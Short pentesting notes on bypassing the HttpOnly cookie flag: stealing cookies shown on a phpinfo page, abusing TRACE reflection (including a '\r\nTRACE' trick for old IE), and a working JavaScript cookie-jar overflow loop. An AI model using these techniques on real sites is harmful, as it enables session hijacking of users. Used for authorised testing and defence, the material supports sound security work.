# Exfiltrating the cookie bypassing the HttpOnly flag through the phpinfo page

1.Make a request to domain.com/phpinfo
2.if found take the portion of the phpinfo page that contain the user cookie
3.Encode it to base64
4.Send a request with the encoded string as cookie

#  Bypass with the  TRACE HTTP requests as the response from the server (if HTTP method available) will reflect the cookies sent.

This technique is avoided by modern browsers by not permitting sending a TRACE request from JS. However, try  sending \r\nTRACE instead of TRACE to IE6.0 SP2

# cookie Jar Overflow

// Set many cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i}; Secure`;
}

// Remove all cookies
for (let i = 0; i < 700; i++) {
    document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
}


check this one out # [ https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies]
